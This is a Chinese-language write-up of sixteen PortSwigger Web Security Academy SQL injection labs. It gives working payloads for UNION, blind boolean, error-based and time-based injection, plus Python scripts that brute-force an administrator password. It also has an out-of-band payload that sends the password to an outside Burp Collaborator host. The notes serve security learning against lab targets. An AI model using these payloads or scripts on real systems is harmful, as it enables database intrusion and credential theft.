## SQL-Injection

[TOC]

#### [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

#### 1. SQL injection UNION attack, determining the number of columns returned by the query

先用`order by`测出来列数是3。

然后用`union select 1,2,3`啥都出不来。

我的payload是：`/filter?category=' union select 1,2,3--`。

因为啥都不出来，直接报错，我就去看了一下官方给的payload：`/filter?category=' union select null,null,null--`

还能这样？最后一个一个的试才发现，1和2的位置填数字会报错，3的位置可以填。但是填`null`是比较稳妥的方案。

#### 2. SQL injection UNION attack, finding a column containing text

还是先用`order by`测出来列数是3。

经过测试：`/filter?category=' union select 1,'sss',3--`

![2.1](sql-injection-burp.assets/2.1.png)

已经找到包含文本的列：第二列。

但是不给过。

居然要输入他给的字符串：`' union select 1,'VaRkKi',3--`

#### 3. SQL injection UNION attack, retrieving data from other tables

题目要求：

> The database contains a different table called `users`, with columns called `username` and `password`.
>
> To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

用`order by`测出来有两列。

payload:`/filter?category=%27%20union%20select%20username,password%20from%20users--`

#### 4. SQL injection UNION attack, retrieving multiple values in a single column

1. 找出列数。
2. 找出哪一列可以用
3. concat或者用`||`连接。

payload:

1. `/filter?category=' union select null,concat(username,password) from users--`
2. `/filter?category=' union select null,username||'~'||password from users--`

#### 5. SQL injection attack, querying the database type and version on Oracle

> 在Oracle数据库上，每个`SELECT`语句都必须指定要选择的表`FROM`。如果您的`UNION SELECT`攻击没有从表中查询，您仍然需要在`FROM`关键字后面加上有效的表名。Oracle上有一个内置表称为DUAL，您可以将其用于此目的。例如：`UNION SELECT 'abc' FROM DUAL`

已经提示了使用的Oracle数据库。

题目要求：

```
Make the database retrieve the strings: 
'Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production, PL/SQL Release 11.2.0.2.0 - Production, CORE 11.2.0.2.0 Production, TNS for Linux: Version 11.2.0.2.0 - Production, NLSRTL Version 11.2.0.2.0 - Production'
```

payload：`/filter?category=' union select null,banner from v$version--`

`banner`在sheet里面去找。

#### 6. SQL injection attack, querying the database type and version on MySQL and Microsoft

这道题不知道是啥问题，一直不行，状态码一直是500。后面来做吧。

我觉得payload大概率就是：`' union select null,@@version--`

官方的payload：`'+UNION+SELECT+@@version,+NULL#`

#### 7. SQL injection attack, listing the database contents on non-Oracle databases

先用order by得到列数是2。

`category='+order+by+2--`

经过测试，发现两列都能用。

`category='+union+select+'abc','def'--`

查找表名：

`category=%27+union+select+table_name,null+from+information_schema.tables--`

查找列名：

`category=%27+union+select+column_name,null+from+information_schema.columns+where+table_name='users_hgcvqp'--`

查找信息：

`category=%27+union+select+username_jjuqsb,password_pygkri+from+users_hgcvqp--`

最后登录administrator。

#### 8. SQL injection attack, listing the database contents on Oracle

Oracle数据库的结构不一样。

> cheat sheet里得到的信息：
> SELECT * FROM all_tables
> SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'

用order by测得列数为2。

查找表名：

`category=%27+union+select+table_name,null+from+all_tables--`

查找列名：

`category=%27+union+select+column_name,null+from+all_tab_columns+where+table_name='USERS_SDGZSD'--`

查找信息：

`category=%27+union+select+USERNAME_XLKHFA,PASSWORD_CUQKST+from+USERS_SDGZSD--`

最后登录administrator。

#### 9. Blind SQL injection with conditional responses

> The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
>
> The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
>
> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

题目提示说是在cookie里面存在sql盲注，而且表名和列名都给了。

经过测试，这里是cookie里的TrackingId进行sql查询，查询成功返回`Welcome back!`，查询失败啥也没有。

POC:

`TrackingId=n4Ytob3xdbmjJsyb' and '1'='1` 有welcome

`TrackingId=n4Ytob3xdbmjJsyb' and '1'='2` 没有

直接用原来写过的sql-bool盲注脚本，改改还能用。

```python
import requests


def guess_number(url, cookie_name, cookie, temp_cookie, num_guess_payload, find_in_text):
    start = 0  # use for length's start
    end = 100  # use for length's end
    while True:
        payload = temp_cookie + num_guess_payload.format((start + end) // 2)
        cookie[cookie_name] = payload
        (start, end) = change_start_end(url, cookie, find_in_text, start, end)
        if start == end:
            print("number={}".format(start))
            break
    return start


def guess_name(url, num_guess_payload, name_guess_payload, find_in_text, cookie_name, cookie):
    temp_cookie = cookie[cookie_name]
    length = guess_number(url, cookie_name, cookie, temp_cookie, num_guess_payload, find_in_text)
    s = ""
    for i in range(1, length + 1):
        start = 32  # use for ascii's start
        end = 126  # use for ascii's end
        while True:
            payload = temp_cookie + name_guess_payload.format(i, (start + end) // 2)
            cookie[cookie_name] = payload
            (start, end) = change_start_end(url, cookie, find_in_text, start, end)
            if start == end:
                s += chr(start)
                break
        print(i, s)


def change_start_end(url, cookie, find_in_text, start, end):
    r = requests.get(url, cookies=cookie)
    if find_in_text not in r.text:
        end = (start + end) // 2
    else:
        start = (start + end) // 2 + 1
    return start, end


if __name__ == "__main__":
    Url = "https://ac721f9d1f7fd2b180ae239000bf0082.web-security-academy.net/filter?category=Accessories"
    Cookie_name = "TrackingId"
    Cookie = {"TrackingId": "ydzubFpeg82eKVTu'", "session": "5fLeIaPZHLmntwNzd2ddTS2b6Jf5XcI3"}
    Find_in_text = "Welcome back!"
    Num_guess_payload = ''' and (select length(password) from users where username='administrator')>{}--'''
    Name_guess_payload = ''' and (select ascii(substr(password,{},1)) from users where username='administrator')>{}--'''
    guess_name(Url, Num_guess_payload, Name_guess_payload, Find_in_text, Cookie_name, Cookie)
```

#### 10. Blind SQL injection with conditional errors

> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
>
> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
>
> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
>
> To solve the lab, log in as the `administrator` user.
>
> This lab uses an Oracle database.

这个用的是Oracle数据库。

> 从sheet里面可以看到：
>
> ```sql
> SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual
> ```

这个表达式：

* 如果condition为真，则执行第一个表达式：to_char(1/0)，然而这个表达式有除零错误（这里不用to_char也是可以的），所以返回状态码500表示服务器端错误。
* 如果condition为假，则执行第二个表达式：NULL，这个表达式没有错误。

于是将上一题的代码的main函数改成这样即可直接跑出来：

```python
if __name__ == "__main__":
    Url = "https://ac301f8d1e4ef79b8055332b00af0046.web-security-academy.net/filter?category=Accessories"
    Cookie_name = "TrackingId"
    Cookie = {"TrackingId": "JQcNHbTPXq9UxrU2'", "session": "PY8nWTd22KvgnKZQ4F024YwRqRcCgnCA"}
    Find_in_text = "Internal Server Error"
    Num_guess_payload = '''||(SELECT CASE WHEN (length(password)>{}) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username='administrator')--'''
    Name_guess_payload = '''||(SELECT CASE WHEN (ascii(substr(password,{},1))>{}) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username='administrator')--'''
    guess_name(Url, Num_guess_payload, Name_guess_payload, Find_in_text, Cookie_name, Cookie)
```

#### 11. Blind SQL injection with time delays

> The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
>
> To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.

注入点在cookie处，这里只要造成十秒以上的延时就可以了。

| 数据库     | 代码                                  |
| :--------- | ------------------------------------- |
| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT sleep(10)`                    |

挨个挨个试就好了。

POC：`TrackingId=jbNcnwblXe2NChRZ'||pg_sleep(10)--;`

#### 12. Blind SQL injection with time delays and information retrieval

> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
>
> To solve the lab, log in as the `administrator` user.

这是一个延时盲注，注入点在cookie那里。

先测试是哪一种数据库，测试出来是：**PostgreSQL**

`TrackingId=JuRFGgqubxoCt6AU'||pg_sleep(10)--`

接着进行时间盲注。

sheet给的：

`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`

脚本：

```python
import requests
import time


def guess_number(url, cookie_name, cookie, temp_cookie, num_guess_payload, inter_time):
    start = 0  # use for length's start
    end = 100  # use for length's end
    while True:
        payload = temp_cookie + num_guess_payload.format((start + end) // 2)
        cookie[cookie_name] = payload
        (start, end) = change_start_end(url, cookie, inter_time, start, end)
        if start == end:
            print("number={}".format(start))
            break
    return start


def guess_name(url, num_guess_payload, name_guess_payload, inter_time, cookie_name, cookie):
    temp_cookie = cookie[cookie_name]
    length = guess_number(url, cookie_name, cookie, temp_cookie, num_guess_payload, inter_time)
    s = ""
    for i in range(1, length + 1):
        start = 32  # use for ascii's start
        end = 126  # use for ascii's end
        while True:
            payload = temp_cookie + name_guess_payload.format(i, (start + end) // 2)
            cookie[cookie_name] = payload
            (start, end) = change_start_end(url, cookie, inter_time, start, end)
            if start == end:
                s += chr(start)
                break
        print(i, s)


def change_start_end(url, cookie, inter_time, start, end):
    time_start = time.time()
    requests.get(url, cookies=cookie)
    time_end = time.time()
    if time_end - time_start < inter_time:
        end = (start + end) // 2
    else:
        start = (start + end) // 2 + 1
    return start, end


if __name__ == "__main__":
    Url = "https://ac5b1f941e51433980e52e3400740020.web-security-academy.net/filter?category=Accessories"
    Cookie_name = "TrackingId"
    Cookie = {"TrackingId": "JuRFGgqubxoCt6AU'", "session": "nlFy5SWHU51psuWucd1ZpXTYtd594zqk"}
    Inter_time = 10
    Num_guess_payload = '''||(SELECT CASE WHEN (length(password)>{}) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users where username='administrator')--'''
    Name_guess_payload = '''||(SELECT CASE WHEN (ascii(substr(password,{},1))>{}) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users where username='administrator')--'''
    guess_name(Url, Num_guess_payload, Name_guess_payload, Inter_time, Cookie_name, Cookie)

```

由于这个burp的网站普遍反映较慢，所以我把间隔时间调的特别长（10秒）来保证足够的精确性，相应的，时间就会需要特别久。

#### 13. Blind SQL injection with out-of-band interaction

题目说的是，这个查询是异步过程，但是可以产生交互。

sheet给的东西：

> The following technique leverages an XML external entity ([XXE](https://portswigger.net/web-security/xxe)) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
> `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual`
>
> The following technique works on fully patched Oracle installations, but requires elevated privileges:
> `SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')`

这个是用XXE漏洞。

payload：

`r1R9CxHx0wDQX1Xc'||(SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://h8qpllvx80x45jkz4nf3w38rhin9by.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--`

因为有许多特殊符号，所以我将上面的payload进行了url编码（也可以只编码特殊符号）

`%72%31%52%39%43%78%48%78%30%77%44%51%58%31%58%63%27%7c%7c%28%53%45%4c%45%43%54%20%65%78%74%72%61%63%74%76%61%6c%75%65%28%78%6d%6c%74%79%70%65%28%27%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%55%54%46%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%72%6f%6f%74%20%5b%20%3c%21%45%4e%54%49%54%59%20%25%20%72%65%6d%6f%74%65%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%68%38%71%70%6c%6c%76%78%38%30%78%34%35%6a%6b%7a%34%6e%66%33%77%33%38%72%68%69%6e%39%62%79%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74%2f%22%3e%20%25%72%65%6d%6f%74%65%3b%5d%3e%27%29%2c%27%2f%6c%27%29%20%46%52%4f%4d%20%64%75%61%6c%29%2d%2d`

#### 14. Blind SQL injection with out-of-band data exfiltration

> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
>
> To solve the lab, log in as the `administrator` user.

这个题要用上面第13题的方法，然后将查询结果返回到burp collaborator里面。

先去第13题的方法测一下用的是哪一个数据库。

经过测试，用的是**Oracle**数据库。

然后去sheet里面找资料：

> ```
> SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual
> ```

这个的意思就是用Oracle的字符串拼接，再加上xxe漏洞将查询到的结果发送到burp collaborator里面。

pyaload：

````
yXi2wL0MOS2G4SvP'||(SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select password from users where username='administrator')||'.xmnyo8c2hz69b2hl7yckpfnf167wvl.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
url编码：
%79%58%69%32%77%4c%30%4d%4f%53%32%47%34%53%76%50%27%7c%7c%28%53%45%4c%45%43%54%20%65%78%74%72%61%63%74%76%61%6c%75%65%28%78%6d%6c%74%79%70%65%28%27%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%55%54%46%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%72%6f%6f%74%20%5b%20%3c%21%45%4e%54%49%54%59%20%25%20%72%65%6d%6f%74%65%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%27%7c%7c%28%73%65%6c%65%63%74%20%70%61%73%73%77%6f%72%64%20%66%72%6f%6d%20%75%73%65%72%73%20%77%68%65%72%65%20%75%73%65%72%6e%61%6d%65%3d%27%61%64%6d%69%6e%69%73%74%72%61%74%6f%72%27%29%7c%7c%27%2e%78%6d%6e%79%6f%38%63%32%68%7a%36%39%62%32%68%6c%37%79%63%6b%70%66%6e%66%31%36%37%77%76%6c%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74%2f%22%3e%20%25%72%65%6d%6f%74%65%3b%5d%3e%27%29%2c%27%2f%6c%27%29%20%46%52%4f%4d%20%64%75%61%6c%29%2d%2d
````

拿到密码之后登陆就好了。

#### 15. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

> This lab contains an SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:
>
> ```
> SELECT * FROM products WHERE category = 'Gifts' AND released = 1
> ```
>
> To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.

这个题应该是注入点在`category = 'Gifts'`这里。

构造payload：

`SELECT * FROM products WHERE category = 'Gifts  ' or '1'='1'--   ' AND released = 1`

payload：

`/filter?category=xxx' or '1'='1'--`

#### 16. SQL injection vulnerability allowing login bypass

> This lab contains an SQL injection vulnerability in the login function.
>
> To solve the lab, perform an SQL injection attack that logs in to the application as the `administrator` user.

这个题的注入点在login那里。

我直接在用户那里输入`' or '1'='1'--`就通过了。

官方的payload：`administrator'--`

这里猜想应该是将用户和密码放到一起进行查找，却没有进行字符串过滤，导致密码那一部分直接被注释掉了。

